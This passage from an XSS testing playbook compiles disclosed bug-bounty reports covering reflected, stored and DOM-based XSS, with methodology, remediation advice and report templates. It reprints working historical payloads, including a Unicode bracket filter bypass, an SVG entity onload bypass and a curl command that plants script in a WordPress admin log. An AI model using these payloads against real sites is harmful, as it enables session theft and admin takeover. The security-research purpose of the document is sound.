  disclosed · **Bounty:** $1,000 · **Body inspected:** Yes — **full report**.

**Affected feature:** the `access_token` query parameter on the v4 map embed page at
`api.tiles.mapbox.com`.

**Reproduction (as submitted):**
````
http://api.tiles.mapbox.com/v4/ctswebrequest.m4ga59jd/page.html?access_token=
[REDACTED_SECRET]
.htaccess.aspx'><script>alert(document.domain)</script>#11/39.9168/-75.1595
````

**Program's own summary, verbatim:** "On April 28th, 2016 @dawgyg reported a
reflected cross-site scripting issue in the map embed page of our v4 map API that
**affected Firefox users only**. An attacker could manipulate the `access_token` query
string parameter on `api.mapbox.com` or `api.tiles.mapbox.com` to inject arbitrary
JavaScript that would then execute in the context of the page."

**Value as a case:** a published disclosure that scopes the finding to a single browser
rather than asserting universal exploitability — the restraint described in §9.

---

#### REFL-068 — Reflected XSS in error pages (NC-SA-2017-008)

- **Program:** Nextcloud · **Report:** <https://hackerone.com/reports/216812>
- **Advisory:** <https://nextcloud.com/security/advisory/?id=nc-sa-2017-008>
- **Archive listing:** <https://h1.security.nathan.sx/nextcloud.html>
- **Published:** 2017-03-28 · **Weakness:** `Cross-site Scripting (XSS) - Reflected`
- **Severity:** low · **Bounty:** $450 · **Body inspected:** Yes — **full report**.

**Researcher's reported PoC:**
````
https://nextcloud-site/index.php/apps/files/ajax/download.php?files=%00&dir=</p>HTMLCODE
````
The reporter described the underlying class as *"an HTML injection vulnerability … flaw
in the Nextcloud (and Owncloud) latest version"* and framed impact as phishing and
simulated login screens against logged-in users.

**Program's official advisory summary, verbatim:**

> **Risk level:** Low
> **CVSS v3 Base Score:** 3.5 (AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N)
> **CWE:** Improper Neutralization of Input During Web Page Generation
> ('Cross-site Scripting') (CWE-79)
>
> **Description:** Inadequate escaping of error messages leads to XSS vulnerabilities
> in multiple components.
>
> Note that Nextcloud employs a strict Content-Security-Policy preventing exploitation
> of this XSS issue on modern web browsers.
>
> **Affected Software:** Nextcloud Server < 11.0.3 (CVE-2017-0891); < 10.0.5
> (CVE-2017-0891); < 9.0.58 (CVE-2017-0891)

**Why it matters here:** this is the archive's only XSS case with a fully published
CVSS vector string, a CWE identifier, an advisory, and CVE assignments — all four
traceable to the source. See [`Stored-XSS.md`](../../Stored-XSS.md) for the sibling advisory
`NC-SA-2017-007` (`DOM-015`).

---

#### Supporting reflected sources

Retrieved with full bodies and available for follow-up, cited by case ID in
[`references/source-index.md`](../../references/source-index.md):

- **REFL-001** `2497` — <https://hackerone.com/reports/2497> — Slack, `$150`.
  *"can be reproduce in IE"*. IE-scoped reflection in a `slack.com/go/` path segment.
- **REFL-023** `134061` — <https://hackerone.com/reports/134061> — Uber Newsroom,
  `$2,000`. Third-party Livefyre embed renders attacker-hosted JSON: the XSS lives in
  the embed's origin, executed in the trusted one.
- **HTML-008** `179426` — <https://hackerone.com/reports/179426> — Blockchain,
  medium. CSP-scoped, reporter-declined script execution; includes an explicit
  remediation recommendation (encode, or whitelist the URL with a strict regexp).
- **CONT-126** `125112` — <https://hackerone.com/reports/125112> — Uber getrush,
  `$3,000`. Unescaped `utm_campaign` marketing parameter; team summary: *"Reflected
  XSS … due to not escaping certain tracking parameters."*

### 12. Professional Vulnerability Report Template

`````markdown
# Reflected XSS in <feature> via <parameter>

## Summary
One paragraph: the input, the context, and the consequence. Name the origin.

## Severity
<high|medium|low> — <one sentence justifying, accounting for CSP and cookie flags>

## Affected endpoint
`GET https://<host>/<path>?<param>=<value>`
Program: <name> · Asset: <host> · Date: <YYYY-MM-DD>

## Vulnerability details
<feature name and what it does; where <parameter> is consumed>

### Input-to-output flow
<attacker-controlled input> -> <server handling> -> <output context in the response>

### Root cause
<why the control present is absent or mismatched to the context>

## Proof of concept
### Step 1 — confirm reflection (inert)
````
https://<host>/<path>?<param>=H1XSSMARKER9
````
> Marker found in response at byte offset <N>, context: <HTML text | attribute | JS string | URL>.

### Step 2 — markup control (harmless)
````
https://<host>/<path>?<param>="><h1>xss-marker
````
> Result: `<h1>` renders as an element.

### Step 3 — script execution
````
https://<host>/<path>?<param>=...
````
> Result: `document.domain` reads `<origin>`, proving execution in the target origin.

### Raw response excerpt
````
<the relevant snippet, with the reflection highlighted>
````

## Remediation
<context-appropriate control; see §10.1>

## References
<advisory / CVE / prior art, with URLs>
`````

**Reporting discipline.** State the browser you tested and the date. Disclose CSP
honestly, in both directions. Include the required preconditions rather than omitting
them. Use `document.domain` rather than a bare alert where you can. Do not claim
persistence.

### 13. References

- OWASP Cheat Sheet — Cross Site Scripting Prevention: <https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>
- OWASP Cheat Sheet — DOM based XSS: <https://cheatsheetseries.owasp.org/cheatsheets/DOM_Based_XSS_Cheat_Sheet.html>
- OWASP Cheat Sheet — Input Validation: <https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html>
- PortSwigger — Cross-site scripting cheat sheet: <https://portswigger.net/web-security/cross-site-scripting/cheatsheet>
- MDN — HTML Living Standard, scripting contexts: <https://developer.mozilla.org/en-US/docs/Web/HTML>
- Nextcloud advisory NC-SA-2017-008: <https://nextcloud.com/security/advisory/?id=nc-sa-2017-008>
- CVE-2017-0891 (as published in that advisory): <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0891>
- Primary reports cited: <https://hackerone.com/reports/246505>,
  <https://hackerone.com/reports/190798>, <https://hackerone.com/reports/136600>,
  <https://hackerone.com/reports/230119>, <https://hackerone.com/reports/135217>,
  <https://hackerone.com/reports/216812>, <https://hackerone.com/reports/179426>,
  <https://hackerone.com/reports/2497>, <https://hackerone.com/reports/134061>,
  <https://hackerone.com/reports/125112>

### 14. Research Gaps and Further Investigation

- **`REFL-082` (Rockstar double-encoding) body withheld.** The specific
  double-decode mechanism is a hypothesis here. Finding the full report would let §7
  move from hypothesis to sourced fact.
- **299 archive titles were no longer publicly retrievable** at research time. Several
  are titled as reflected XSS and would likely strengthen §2–§7. They are recorded as
  title-only in [`references/source-index.md`](../../references/source-index.md).
- **No post-2017 evidence.** Every source predates the removal of Flash and the
  mainstreaming of strict CSP. Current exploitability of each case has not been
  re-tested and should not be assumed. Modern DOM sinks (`document.write`,
  `innerHTML`, framework renderers) are under-represented relative to their current
  prevalence — see [`DOM-Based-XSS.md`](../../DOM-Based-XSS.md).
- **Severity calibration.** The archive mixes HackerOne severity ratings, CVSS vectors,
  and raw bounty figures. A cross-program severity comparison is not supportable from
  this data and has not been attempted.
- **Worth investigating with fresh sources:** mutation-based context detection
  (whether the reflection point tolerates `'`, `"`, `<`, `>`, and backtick independently);
  and CSP-bypass-assisted severity reassessment for the reports rated `low` because of
  a CSP that has since changed.



---

<!-- PART 3 of 12 :: Stored-XSS.md -->

## Stored XSS

### 1. Overview

A stored XSS exists when attacker input is persisted by the application and later
rendered, unneutralised, to **other** users. It is the highest-impact member of the
XSS family because it needs no victim interaction beyond the victim visiting an
ordinary page: no link to click, no crafted URL, no unusual user agent.

The archive's stored-XSS reports cluster into three shapes, and the shape — not the
payload — determines what a good report looks like:

1. **Self-service stored XSS** — any low-privilege user writes to a field that is
   rendered to other users (profile names, comments, app names, enhancement names).
   The escalation path is privilege: attacker writes, a more privileged user views.
2. **Stored XSS into a privileged console** — the payload fires in an admin panel.
   Highest severity in the class. `STOR-074` (Uber Newsroom, `$5,000`) is the anchor
   case.
3. **Stored XSS carried across a trust boundary** — the persisted value is later
   served to a *different origin* or executed in a *different principal's* session
   (embedded app in an admin frame, shared project, third-party embed). These have a
   distinct methodology because the tester must trace where the stored bytes end up.

### 2. Root Cause and Technical Mechanics

The universal flow:

````
attacker stores payload  →  storage  →  some other user loads page
                         →  template/JS renders without context-correct encoding
                         →  script runs as the viewer
````

Every one of these is the *same* root cause as reflected XSS — missing or
context-mismatched output encoding at the render step. What changes is the
**persistence** and the **victim set**.

#### 2.1 The write path is rarely the bug

In nearly every report in this archive, the researcher could store arbitrary bytes
without resistance. The defect is consistently on the **read/render** path. This is
why stored-XSS testing must always include a second account:

> Store as user A → view as user B → observe execution as B.

`STOR-146` (Mixmax) makes the escalation explicit: the attacker creates an
enhancement, **shares it with another user or team**, and the payload fires when the
recipient accepts it and is redirected back to the integrations page.

#### 2.2 Privilege escalation is the impact story

`STOR-074` (Uber Newsroom) is the clearest example in the archive. An
**unauthenticated** user triggers a WordPress `wp_redirect()` hook; the Stream plugin
logs the URL unescaped into the admin activity log; when an administrator opens the
dashboard, the script executes **with administrator privileges** — and the reporter
noted this "can (under normal setup) be further used to inject attacker-supplied PHP
code on the server."

The reporter's supplied reproduction is a single unauthenticated `curl` command with a
spoofed `Referer` carrying the payload. No login, no user interaction, no victim link.

#### 2.3 Filter failures specific to stored content

`STOR-142` and `STOR-143` (both Rockstar, both `$1,000`, both medium) are a matched
pair, and the team's own summaries are the best blocklist-failure documentation in
this knowledge base:

- **STOR-142** (Snapmatic comments): *"we were not filtering **＜** and **＞**
  characters the same as `<` and `>`."*
- **STOR-143** (Profile activity feed): *"certain obscure characters were not being
  converted to HTML entities properly."* The disclosed exploit string was
  `†‡•＜img src=a onerror=javascript:alert('hacked')>…‰€`.

The lesson: fullwidth / obscure Unicode lookalikes for `<`, `>`, `"` are a standing
test input for any filter doing character-level matching. See
[`Filter-Bypass-and-Encoding.md`](../../Filter-Bypass-and-Encoding.md).

### 3. Attack Surface and Preconditions

Where stored payloads live in this archive:

| Surface | Case | Note |
| --- | --- | --- |
| Comments | `STOR-142`, `STOR-014` (Nextcloud self-XSS in comment edit) | UGC, high volume |
| Profile / display names | `STOR-105`, `STOR-045`, `CONT-035` | rendered in many places |
| Activity feeds / logs | `STOR-143`, `STOR-074` | read by admins |
| Application names | `STOR-105` (Slack) | rendered on a path derived from the name |
| Feature/config labels | `STOR-146`, `STOR-147` (Mixmax), `STOR-035` (Shopify Buy Button) | low-privilege write, high-privilege read |
| Uploaded content | `STOR-144` (Shopify SVG icon), `FILE-*` | see [`File-Upload-and-SVG-XSS.md`](../../File-Upload-and-SVG-XSS.md) |
| Template / map attributes | `STOR-045` (Mapbox attribution), `CONT-095` (Mapbox share) | rendered into third-party pages |
| Third-party embeds | `STOR-045`, `CONT-126` | see [`Browser-Extension-and-Messaging-XSS.md`](../../Browser-Extension-and-Messaging-XSS.md) |

**Preconditions.** Usually: a registered account (sometimes any authenticated user,
sometimes a specific role). Rarely: an admin account, because the whole point is that
an ordinary account suffices. Always: **a second principal who views the stored value.**

### 4. Manual Testing Methodology

1. **Pick low-privilege write fields.** Profile names, comments, org/team labels,
   file metadata, "add integration" forms. Anything a normal user can write.
2. **Store a marker first.** `H1XSSSTORED9`. Load the page as the *author*. If the
   marker is escaped everywhere you can see, you may only have an HTML-injection or
   self-XSS bug, not stored XSS.
3. **Log out. Log in as user B.** Never conclude from the author's own view. In this
   archive, self-XSS findings were filed separately and were treated as a different
   class — see [`Self-XSS.md`](../../Self-XSS.md).
4. **Trace every render site.** A value escaped in the profile page may be unescaped in
   the activity feed, the admin panel, an export, or a notification email. Grep the
   stored value across the app. `STOR-146` found the same bug in "Social Badges"
   (`STOR-147`) *after* it had been accepted in a sibling feature — the reporter noted
   the analogous section "are not accepting this payload," i.e. a **per-widget**
   inconsistency.
5. **Enumerate sibling features explicitly.** `STOR-146`/`STOR-147` are one root cause
   found twice because the reporter tested the adjacent widget. Do this deliberately.
6. **Escalate the impact claim by naming the viewer.** "Stored XSS" is weak. "Stored
   XSS executing in the admin panel when an administrator views the activity log" is a
   severity.
7. **For cross-boundary cases, follow the bytes off-origin.** If a value is stored and
   served to another origin, demonstrate it there.

### 5. Input and Output Context Analysis

Stored XSS obeys exactly the same context rules as
[`Reflected-XSS.md`](../../Reflected-XSS.md) §5, but the observed contexts in this archive
skew differently — toward attribute and URL contexts, because display names are
routinely interpolated into `title=`, `alt=`, `href=` and avatar URLs:

| Observed context | Case | Break-out |
| --- | --- | --- |
| Unquoted/quoted HTML attribute | `STOR-146`, `STOR-035`, `STOR-105` | `"><img src=x onerror=...>` |
| Path segment derived from user input | `STOR-105` (Slack app name) | `"/><script>alert(/Bhati/)</script>` |
| `href` / URL attribute | `STOR-147` (Mixmax social badge URL) | `javascript:alert(1)` |
| HTML text in a third-party template | `STOR-045` (Mapbox attribution) | `"><img src=x onerror=...>` |
| Admin log viewer | `STOR-074` | unescaped log line |
| XML/SVG attribute allow-list | `STOR-144` | `<!ENTITY>` + `onload` |

`STOR-045` deserves a note because its impact is *wider than the reporting origin*.
The Mapbox team summary states it allowed "the execution of arbitrary JavaScript in
websites using Mapbox.js with the uncommon usage scenario of loading untrusted
TileJSON" — so the stored value left mapbox.com and executed on third-party sites.

### 6. Test Cases and Proof-of-Concepts

#### 6.1 Historical payloads (verbatim from the cited reports)

Historical. Understand them; do not reuse them against live targets.

| Case | Report | Field | Payload as submitted |
| --- | --- | --- | --- |
| STOR-142 | `231389` | Snapmatic comments | Unicode-lookalike `<` `>` bypass (filter detail in team summary) |
| STOR-143 | `231444` | Profile activity feed | `†‡•＜img src=a onerror=javascript:alert('hacked')>…‰€` |
| STOR-146 | `237100` | Enhancement name | `"><img src=x onerror=alert(document.domain)>` |
| STOR-147 | `238906` | Social badge URL | `javascript:alert(1)` |
| STOR-105 | `159460` | Slack app `name` | `"/><script>alert(/Bhati/)</script>` |
| STOR-045 | `54327` | Mapbox attribution | `"><img src=x onerror=alert(document.cookie)>` |
| STOR-074 | `127948` | Referer on `postpass` | Referer containing `aaa%3cscript%3ealert('stored xss');%3c/script%3e` |

#### 6.2 Newly authored illustrations (not from the archive)

Storage probe, in increasing strength:

````
H1XSSSTORED9                     → reflection as escaped text
"><h1>xss-marker                 → markup control
"><img src=x onerror=alert(1)>   → attribute/event-handler injection
javascript:alert(1)              → URL attribute (only where a URL field exists)
````

Unicode lookalike set — the standing test for any character-level filter. These are
the *codepoints* to test with, not advice to deploy them:

| Lookalike | Codepoint | Resembles |
| --- | --- | --- |
| ＜ FULLWIDTH LESS-THAN SIGN | U+FF1C | `<` |
| ＞ FULLWIDTH GREATER-THAN SIGN | U+FF1E | `>` |
| ″ DOUBLE PRIME | U+2033 | `"` |
| ＜/＞ fullwidth variant | U+FF1C / U+FF1E | as above |

`STOR-143` is the sourced confirmation that this exact class works: the payload mixed
`† ‡ • ‰ €` with fullwidth `＜`/`＞`.

**Safe proof.** Store a payload that reads `document.domain` or exfiltrates to a
collaborator endpoint rather than opening an alert. `STOR-045`'s PoC read
`document.cookie`; that is the minimum acceptable bar for a stored finding.

### 7. Encoding, Filtering, and Parsing Behavior

Three failure modes are documented in this archive, and each produces a distinct
bypass strategy:

| Failure | Case | Consequence |
| --- | --- | --- |
| Filter checks ASCII `<`/`>` only | `STOR-142` | Fullwidth `＜`/`＞` reach the template |
| Entity conversion misses obscure chars | `STOR-143` | Mixed Unicode payload survives |
| Allow-list bypassed by an unparsed construct | `STOR-144` | `<!ENTITY>` neutralises the SVG attribute allow-list, unmasking `onload` |

`STOR-144` (Shopify, `$5,000`, high) is the most interesting, because the filter was
*not* naive — Shopify enforces a documented SVG allow-list for app navigation icons,
per the report. But as the researcher established, *"when the SVG contains an XML
entity this whitelist is no longer enforced allowing the developer to include malicious
attributes such as `onload`."* An internal DTD entity declared in the SVG:
````xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE svg [ <!ENTITY elem ""> ]>
<svg onload="alert(document.domain);" height="16" width="16"> &elem; </svg>
````
The lesson generalises past SVG: **a parser-differential between the validator and the
renderer disables the allow-list.** Test validators with the constructs they may not
handle — DTDs, entities, CDATA, namespace prefixes, encoding declarations.

### 8. Impact and Severity Considerations

Stored XSS severity is set by **who views it** and **what that principal can do**.

| Report | Program | H1 severity | Bounty | Viewer |
| --- | --- | --- | --- | --- |
| `232174` STOR-144 | Shopify | high | $5,000 | store admin + partners.shopify.com |
| `231053` DOM-018 | Shopify | not disclosed | $3,000 | any visitor, any shop |
| `127948` STOR-074 | Uber Newsroom | not disclosed | $5,000 | site administrator |
| `231389` STOR-142 | Rockstar Games | medium | $1,000 | other users (UGC comments) |
| `231444` STOR-143 | Rockstar Games | medium | $1,000 | other users (activity feed) |
| `237100` STOR-146 | Mixmax | medium | not disclosed | invited recipient |
| `241008` STOR-* | Shopify | not disclosed | not disclosed | — |

**Calibration guidance.** The two Rockstar reports sit at `medium` / `$1,000` with a
plain UGC viewer. The Uber admin-panel report sits at `$5,000` because the execution
principal is an administrator with server-side consequences. That is a 5x difference
driven entirely by the viewer, not by the payload. State the viewer explicitly in every
stored-XSS report.

**Honest ceilings.** Where the viewing context has no valuable cookie, say so — the
`191380` researcher's *"ton.twitter.com has no valuable cookies at all"* is the model.
Claiming account takeover without a demonstrated path to credentials is the most
common over-claim in this class.

### 9. False Positives and Limitations

- **Self-XSS is not stored XSS.** If only the author can trigger it, it belongs in
  [`Self-XSS.md`](../../Self-XSS.md). `STOR-014` (Nextcloud, `$100`) was filed as *reflected
  self-XSS* for exactly this reason and paid accordingly.
- **Stored but inert ≠ stored XSS.** `HTML-010` (`198907`, VK.com) is the honest
  counter-example: the researcher stored markup that "will be parsed in that area, but
  after saving it, it won't parse," and **explicitly declined to claim XSS** — *"I'm
  still looking into this, as this could be a possible XSS vuln if I can find vectors."*
  Correct restraint, correctly categorised.
- **Per-widget inconsistency is not two bugs.** `STOR-146` and `STOR-147` are one root
  cause across sibling widgets; file them together with both reproductions.
- **Duplicates.** Several reports in this archive were explicitly filed as
  "similar to #NNNNNN" (`217745`: *"similar in impact, exploitability and root-cause as
  report #205701"*). Deduplicate, but preserve each citation.
- **Erasure testing.** A stored XSS claim is stronger if you confirm the payload is
  removed from storage on edit/delete. Note it if you test it.

### 10. Remediation and Regression Testing

#### 10.1 Remediation

- **Encode on render, for every consumer.** Stored values have many read paths; a fix
  on one page does not fix the feed, the export, the email, or the API.
- **Prefer DOM construction** (`textContent`, `createElement`, `.value`) over string
  concatenation. This removes the context question entirely.
- **Constrain stored values at write time as defence in depth** — length, allowed
  charset, no control characters. Not a substitute for output encoding.
- **Revalidate the SVG allow-list against a parser that handles DTDs and entities**,
  or reject SVG entirely (see [`File-Upload-and-SVG-XSS.md`](../../File-Upload-and-SVG-XSS.md)).
- **Sanitise with an allow-list library** for rich-text fields, configured per context.
- **Review admin consoles specifically.** Log viewers and moderation queues are a
  recurring high-severity sink (`STOR-074`, `CONT-185`, `CONT-155`).
- **Do not rely on CSP** as the fix. It is defence in depth.

#### 10.2 Regression tests

| Test | Asserts |
| --- | --- |
| Store a payload as user A; render as user B; assert escaped | cross-user rendering safe |
| Repeat for every render path found by grep (feed, admin, export, email) | all paths encoded |
| Store fullwidth `＜`/`＞` and U+2033 in the same field | filter handles Unicode |
| Store `<!DOCTYPE svg [<!ENTITY x "">]>` in any SVG-accepting field | validator handles DTD |
| Store `javascript:` in every URL-accepting field | scheme allow-list enforced |
| Delete the record; re-check every render path | payload gone from storage |
| Submit a benign payload, confirm app still works | no over-blocking |

### 11. Historical Bug Bounty Case Studies

Only sourced facts. Fields absent from the source are marked
**Not disclosed in the source.** Inventory:
[`references/source-index.md`](../../references/source-index.md).

---

#### STOR-074 — Stored XSS on newsroom.uber.com admin panel / Stream WordPress plugin

- **Program:** Uber · **Report:** <https://hackerone.com/reports/127948>
- **Archive listing:** <https://h1.security.nathan.sx/uber.html>
- **Published:** 2016-04-03 · **Weakness:** `Cross-site Scripting (XSS) - Generic`
- **Severity:** Not disclosed in the source · **Bounty:** $5,000
- **Body inspected:** Yes — **full report**.

**Affected feature:** the Stream WordPress plugin's activity log, rendered in the
WordPress admin dashboard.

**Preconditions:** **none** — the report states *"An unauthenticated user can produce
such a log message to inject JavaScript in the admin panel."*

**Reproduction (as submitted):**
````
curl -v -H 'Referer: /hello?plugin-editor.php&file=aaa%3cscript%3ealert(%27stored%20xss%27);%3c/script%3e' \
     --data 'post-password=foo' 'https://newsroom.uber.com/wp-login.php?action=postpass'
````
Then open the Stream tab in the WordPress Dashboard.

**Root cause (researcher's description):** *"the logged events aren't sanitized
properly and can contain HTML tags and JavaScript."* The reporter identified the exact
code path in `connectors/installer.php`: a `wp_redirect()` hook
(`callback_wp_redirect`) inspects redirect locations for the plugin editor and logs
them, passing the query string through unescaped.

**Impact as claimed:** *"When an administrator views the log, the script would be
evaluated with administrator privilegs and can (under normal setup) be further used to
inject attacker-supplied PHP code on the server."*

**Remediation:** Not disclosed in the source.

---

#### STOR-142 — Stored XSS in snapmatic comments

- **Program:** Rockstar Games · **Report:** <https://hackerone.com/reports/231389>
- **Archive listing:** <https://h1.security.nathan.sx/rockstargames.html>
- **Published:** 2017-05-24 · **Weakness:** `Cross-site Scripting (XSS) - Stored`
- **Severity:** medium · **Bounty:** $1,000
- **Body inspected:** No — withheld. Evidence level: **partial report**.

Official team disclosure summary, verbatim:

> "In this report, the researcher found that we were not filtering **＜** and **＞**
> characters the same as `<` and `>`. This allowed the researcher to craft XSS POCs
> that bypassed our filters, particularly on UGC comments. We have updated our filters
> to amend this oversight."

- **Remediation (documented):** filters updated to handle fullwidth angle brackets.
- Reproduction payload, endpoint, and exact field: **Not disclosed in the source.**

---

#### STOR-143 — Stored XSS in profile activity feed messages

- **Program:** Rockstar Games · **Report:** <https://hackerone.com/reports/231444>
- **Archive listing:** <https://h1.security.nathan.sx/rockstargames.html>
- **Published:** 2017-05-24 · **Weakness:** `Cross-site Scripting (XSS) - Stored`
- **Severity:** medium · **Bounty:** $1,000
- **Body inspected:** No — withheld. Evidence level: **partial report**.

Official team disclosure summary, verbatim:

> "The researcher was able to demonstrate a Stored XSS vulnerability in the Profile and
> Crew Feed endpoints. The exploit string worked because the researcher realized that
> certain obscure characters were not being converted to HTML entities properly. The
> exploit string was `†‡•＜img src=a onerror=javascript:alert('hacked')>…‰€`. This
> behavior allowed the researcher to insert and run his own JavaScript.
>
> We were able to update our code to properly filter characters like the ones in the
> exploit string."

**Why it matters here:** the only fully published payload in the archive for a
Unicode-normalisation filter bypass, and a ready-made regression test string.

---

#### STOR-146 / STOR-147 — Mixmax: enhancement name and social badge URL

- **Reports:** <https://hackerone.com/reports/237100> and
  <https://hackerone.com/reports/238906>
- **Archive listing:** <https://h1.security.nathan.sx/mixmax.html>
- **Published:** 2017-06-06 and 2017-06-11 · **Weakness (STOR-146):**
  `Cross-site Scripting (XSS) - Stored` · **Severity (STOR-146):** medium
- **Bounty:** Not disclosed in the source
- **Body inspected:** Yes — both **full reports**.

**STOR-146 — feature:** Settings → Integrations & API → *Add Enhancement* → **Name**
field on `app.mixmax.com`.

**Reproduction (as submitted):** enter `"><img src=x onerror=alert(document.domain)>`
in the Name field → add the enhancement → **click the share icon beside it** → share
with a user or team → the recipient receives an email → on accepting, they are
redirected to the integrations page and the payload fires.

**Impact mechanism:** the enhancement name crosses a **share boundary** into another
principal's session. This is the pattern that distinguishes a serious stored XSS from
a cosmetic one.

**STOR-147 — feature:** Templates → Enhance → **Social Badges** → any social button
URL. Payload `javascript:alert(1)`.

The reporter explicitly noted the **per-widget inconsistency**, verbatim: *"The similar
social sections in Call to Action button are not accepting this payload, so but this
is not fixed in Social Badges section."* That sentence is the practical argument for
enumerating sibling widgets — see §4 step 5.

---

#### STOR-045 — Persistent XSS in map attribution

- **Program:** Mapbox · **Report:** <https://hackerone.com/reports/54327>
- **Archive listing:** <https://h1.security.nathan.sx/mapbox.html>
- **Published:** 2015-04-02 · **Weakness:** `Cross-site Scripting (XSS) - Generic`
- **Severity:** Not disclosed in the source · **Bounty:** $1,000
- **Body inspected:** Yes — **full report**.

**Affected feature:** the **Attribution** field of a custom style in Mapbox Studio.
Payload as submitted: `"><img src=x onerror=alert(document.cookie)>`.

**Reproduction (as submitted):** create a style → put the payload in the Attribution
field → upload → save a project using it → the project list page executes the payload.
The reporter also demonstrated that **sharing the project makes it fire for
non-account holders**, noting the code "will be already executed" but only *after*
sharing is the useful form of the bug.

**Team summary, verbatim:** the issue *"allowed a potential attacker to have full
control over a user's Mapbox.com session and execute arbitrary JavaScript commands.
It also allowed for the execution of arbitrary JavaScript in websites using Mapbox.js
with the uncommon usage scenario of loading untrusted TileJSON."*

**Why it matters here:** the stored value escapes the reporting origin and executes on
**third-party sites**. Treat every "paste your map here" embed as an XSS sink.

---

#### STOR-144 — XSS via whitelist bypass in SVG icon for sales channel applications

- **Program:** Shopify · **Report:** <https://hackerone.com/reports/232174>
- **Archive listing:** <https://h1.security.nathan.sx/shopify.html>
- **Published:** 2017-05-26 · **Weakness:** `Cross-site Scripting (XSS) - Stored`
- **Severity:** high (author: Team) · **Bounty:** $5,000
- **Body inspected:** Yes — **full report**.

**Affected feature:** the "Navigation icon" upload for a **Sales Channel** app in the
Partners dashboard.

**Root cause (researcher):** Shopify limits the SVG to allowed elements and attributes
per its design guidelines, but *"when the SVG contains an XML entity this whitelist is
no longer enforced allowing the developer to include malicious attributes such as
`onload`."*

**PoC (as submitted):**
````xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE svg [
    <!ENTITY elem "">
]>
<svg onload="alert(document.domain);" height="16" width="16">
  &elem;
</svg>
````

**Impact as claimed:** *"By uploading a malicious SVG a developer can obtain XSS on
both partners.shopify.com, as well as any the admin panel of any shop which has
authorized the sales channel."*

**Preconditions:** a developer account able to create a Sales Channel app; for the
`$shop$.myshopify.com/admin/` target, that app must be authorised on a shop.

**Related:** [`File-Upload-and-SVG-XSS.md`](../../File-Upload-and-SVG-XSS.md).

---

#### Supporting stored sources (full bodies retrieved)

- **STOR-105** `159460` — <https://hackerone.com/reports/159460> — Slack, `$1,000`.
  App `name` field; payload `"/><script>alert(/Bhati/)</script>`; notably the payload
  also **propagated into the app's URL path**, and the reporter confirmed *"Its also
  work on other user as well"* with a shareable victim link.
- **STOR-035** `186462` — <https://hackerone.com/reports/186462> — Shopify, `$500`.
  'Buy Button' page variant-title attribute, selector `div[@class='cart-permalink__preview-variant-title']`.

### 12. Professional Vulnerability Report Template

`````markdown
# Stored XSS in <feature> executes in <viewer context>

## Summary
<One paragraph: the field any user can write, who views it, what the viewer can do.>

## Severity
<high|medium|low> — <name the viewing principal and the consequence.>

## Affected endpoint / feature
`https://<host>/<path>` · Field: `<field name>` · Program: <name>

## Vulnerability details
### Write path
<field, who can write it, any validation observed>

### Read path
<every render site, with URLs>

### Root cause
<encoding applied, and the context it fails to match>

## Proof of concept
### Step 1 — store (as low-privilege user A)
````
Field: <field name>
Value:  "><img src=x onerror=alert(1)>
````
> Saved successfully; no validation error.

### Step 2 — view as user B (different account)
````
GET https://<host>/<path>
Account: user B (role: <role>)
````
> `alert` fires as user B in origin <origin>.

### Step 3 — impact principal
> Payload executing in <admin panel | activity feed | ...> as <role>.

## Remediation
<output encoding per render site; consider sanitiser for rich text>

## Regression checks
<List every render path that must be re-tested.>
`````

**Reporting discipline.** Always include the second-account view. Always name the
viewer. Test and disclose whether a CSP mitigates it. If the viewing context has no
valuable session, state that rather than implying account takeover.

### 13. References

- OWASP Cheat Sheet — Cross Site Scripting Prevention: <https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>
- OWASP — Cross Site Scripting Prevention Cheat Sheet (DOM): <https://cheatsheetseries.owasp.org/cheatsheets/DOM_Based_XSS_Cheat_Sheet.html>
- OWASP — Input Validation: <https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html>
- OWASP — File Upload Cheat Sheet: <https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html>
- DOMPurify (allow-list sanitiser): <https://github.com/cure53/DOMPurify>
- Reports cited: <https://hackerone.com/reports/127948>, <https://hackerone.com/reports/231389>,
  <https://hackerone.com/reports/231444>, <https://hackerone.com/reports/237100>,
  <https://hackerone.com/reports/238906>, <https://hackerone.com/reports/54327>,
  <https://hackerone.com/reports/232174>, <https://hackerone.com/reports/159460>,
  <https://hackerone.com/reports/186462>

### 14. Research Gaps and Further Investigation

- **`STOR-142` and `STOR-143` bodies withheld.** Their published summaries give the
  root cause and (for STOR-143) the payload, but not the endpoint or exact field. The
  full reports would let §7 be verified rather than inferred.
- **The `‹＜›` regression string is confirmed but untested here.** `STOR-143`'s
  payload mixes `† ‡ • ‰ €` with fullwidth brackets; which specific characters matter
  (versus which merely accompanied them) cannot be determined from the summary.
- **No modern sources.** Nothing in this playbook postdates 2017. Modern rich-text
  editors, sanitiser bypasses, and DOM-clobbering persistence are underrepresented.
- **Under-explored in the archive:** sanitiser-configuration bugs (allow-list too
  broad, e.g. allowing `<a href="javascript:...">`), mutation-XSS via DOM clobbering,
  and stored XSS surviving server-side sanitisation through re-serialisation.
- **Recommended follow-up:** for each reported field, determine whether the app
  sanitises on write, on read, or both — the archive rarely establishes which, and the
  answer changes the correct fix.



---

<!-- PART 4 of 12 :: DOM-Based-XSS.md -->

## DOM-Based XSS

### 1. Overview

DOM-based XSS occurs when attacker input never reaches the server at all. The input
travels in the URL fragment, `postMessage` data, `localStorage`, or a DOM value, and
is read by client-side JavaScript that writes it into a dangerous sink **without
encoding**.

The defining test: **load the page with JavaScript disabled or the payload never sent
to the origin, and it still fires.** If the payload appears in an HTTP request, it is
not DOM-based — that is [`Reflected-XSS.md`](../../Reflected-XSS.md).

Only 22 archive entries classified as DOM XSS, but they represent a distinct
methodology and should be hunted with a different toolset.

### 2. Root Cause and Technical Mechanics

````
attacker controls a client-side value (location.hash / postMessage / storage)
        →  JS reads it (location.hash, document.referrer, window.name, e.data, …)
        →  JS writes it to a sink (innerHTML, outerHTML, document.write,
           insertAdjacentHTML, jQuery .html()/.append(), eval, setTimeout(string),
           location.href = … , Range.createContextualFragment)
